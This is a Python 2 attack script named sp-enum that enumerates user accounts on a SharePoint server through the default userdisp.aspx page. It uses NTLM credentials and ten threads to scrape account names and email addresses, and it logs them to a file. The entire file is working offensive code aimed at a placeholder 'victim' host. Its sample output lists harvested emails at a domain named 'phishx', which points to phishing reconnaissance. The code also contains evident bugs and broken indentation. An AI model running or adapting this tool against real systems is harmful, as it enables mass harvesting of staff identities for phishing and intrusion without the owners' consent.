#!/usr/bin/env python
# sp-enum - sharepoint email enumeration tool
# ==============================================
# This is a email enumeration tool for sharepoint installations
# that makes use of "_layouts/userdisp.aspx" default file to leak
# email addresses from sharepoint information. This requires a 
# username and password usually to exploit. There probably is bugs
# in this code, it uses 10 threads to enumerate upto 1000 users with
# 200 user checks per-thread. Everything is logged automatically to
# a file.
#
# [+] sp-email.py - a email enumeration tool for sharepoint
# 1 http://1.1.1.1 found: https://1.1.1.1/Person.aspx?accountname=DOM1\crystal
# 2 http://1.1.1.1 found: https://1.1.1.1/Person.aspx?accountname=DOM1\peter
# 2 http://1.1.1.1 email: peter.pan@phishx.com
# 1 http://1.1.1.1 email: crystal@phishx.com
#
# -- prdelka
import urllib2, re, thread, time, sys, os, getopt, datetime
from ntlm import HTTPNtlmAuthHandler

user = "DOMAIN\\USERNAME"
password = "Pa55w0rd!!"
gurl = "https://sharepoint.victim.com"
verbose = False
threads = 10

def worker_thread(id,uid,file,lock) :
	global threads
	puid = uid + 200
	while uid < puid :
		try:
        		url = "%s/_layouts/userdisp.aspx?ID=%d" % (gurl,uid)
                	passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
                	passman.add_password(None, url, user, password)
                	auth_NTLM = HTTPNtlmAuthHandler.HTTPNtlmAuthHandler(passman)
                	opener = urllib2.build_opener(auth_NTLM)
			urllib2.install_opener(opener)
			response = urllib2.urlopen(url)
			# bug, need to handle errors here
			html = response.read()
                	output = html.split("Object moved to <a href=\"")
                	username = output[1].split("&amp;")
			if username[1].find("https://extranet"):
				url = username[0]
				lock.acquire()	
				file.write("%d %s found: %s\n" % (uid,gurl,urllib2.unquote(url)))
				print "%d %s found: %s" % (uid,gurl,urllib2.unquote(url))
				lock.release()
				passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
				passman.add_password(None, url, user, password)
				auth_NTLM = HTTPNtlmAuthHandler.HTTPNtlmAuthHandler(passman)
				opener = urllib2.build_opener(auth_NTLM)
				urllib2.install_opener(opener)
				response = urllib2.urlopen(url)
				html = response.read()
				if html.find("mailto:"):
					output = html.split("mailto:")
					email = output[1].split("\">")
					lock.acquire()
					file.write("%d %s email: %s\n" % (uid,gurl,urllib2.unquote(email[0])))
					print "%d %s email: %s" % (uid,gurl,urllib2.unquote(email[0]))
					lock.release()
			uid += 1
		except:
			if verbose == True:
				lock.acquire()
				print "[-] BAD UID %d" % uid
				lock.release()
			uid += 1
	lock.acquire()
	threads -= 1
	print "thread %d complete %d threads left" % (id,threads) 
	lock.release()

def usage():
	print "[ Usage.\n["
	print "[ --user=<domain\\\\user> OR -u <domain\\\\user>"
	print "[ --pass=<password> OR -p <password>"
	print "[ --targ=<http://www.example.com:88> OR -t <blah>"
	print "[ --help OR -h this."
 	print "[ -v toggle verbose mode"
	print "["
	print "[ Set the username and password in the source variables for best results"
	print "[ unless no special chars are needed."
	print "[\n[ All enumerated emails are logged to sp-email.log automatically"

if __name__ == "__main__":
	print "[+] sp-email.py - a email enumeration tool for sharepoint"
   	try:
        	opts, args = getopt.getopt(sys.argv[1:], "u:p:t:hv", ["user=", "pass=", "targ=", "help"])
    	except getopt.GetoptError as err:
        	usage()
		print str(err) 
        	sys.exit(2)

    	for o, a in opts:
        	if o == "-v":
            		verbose = True
        	elif o in ("-h", "--help"):
            		usage()
            		sys.exit()
        	elif o in ("-u", "--user"):
            		user = a	
		elif o in ("-p", "--pass"):
			password = a
		elif o in ("-t", "--targ"):
			gurl = a
	       	else:
          		assert False, "unhandled option"

	if len(user) == 0 | len(password) == 0 | len(gurl) == 0:
		usage()
		sys.exit(2)

	file = open('./sp-email.log', 'a+')
	file.write("Started at %s against %s\n" % (str(datetime.datetime.now()),gurl))
	lock = thread.allocate_lock()
	userid = 0
	for i in range(10):
        	thread.start_new_thread(worker_thread, (i,userid,file,lock))
		userid += 200
	while threads:
		pass
